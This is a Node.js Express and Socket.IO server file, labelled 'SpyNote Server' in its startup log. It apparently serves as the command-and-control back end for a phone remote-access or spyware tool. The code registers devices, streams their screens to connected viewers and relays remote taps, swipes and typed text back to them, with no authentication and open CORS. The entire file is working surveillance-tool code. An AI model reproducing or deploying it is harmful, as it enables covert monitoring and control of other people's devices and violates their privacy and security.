
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    transports: ['websocket'] // ✅ Force WebSocket only
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        console.log("✅ Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.delete('/unregister/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    if (devices.has(deviceId)) {
        devices.delete(deviceId);
        console.log("✅ Device unregistered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("📱 Device joined room:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, text } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0,
                text: text || ''
            });
            console.log('🎮 Control:', action, 'to', deviceId);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}`);
});
